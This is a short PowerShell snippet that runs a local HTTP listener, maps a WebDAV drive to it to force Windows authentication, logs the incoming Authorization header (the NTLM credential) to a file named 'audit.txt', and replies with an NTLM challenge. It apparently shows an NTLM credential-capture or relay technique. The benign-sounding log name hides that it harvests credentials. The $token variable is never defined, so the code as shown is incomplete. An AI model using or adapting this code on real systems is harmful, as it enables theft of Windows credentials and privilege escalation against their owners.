$server = New-Object System.Net.HttpListener
$server.Prefixes.Add("http://127.0.0.1:9090/")
$server.Start()
net use z: \\127.0.0.1@9090\share
$request = $server.GetContext()
Add-Content -Path audit.txt -Value $request.Request.Headers["Authorization"]
$request.Response.AddHeader("WWW-Authenticate", "NTLM " + $token)
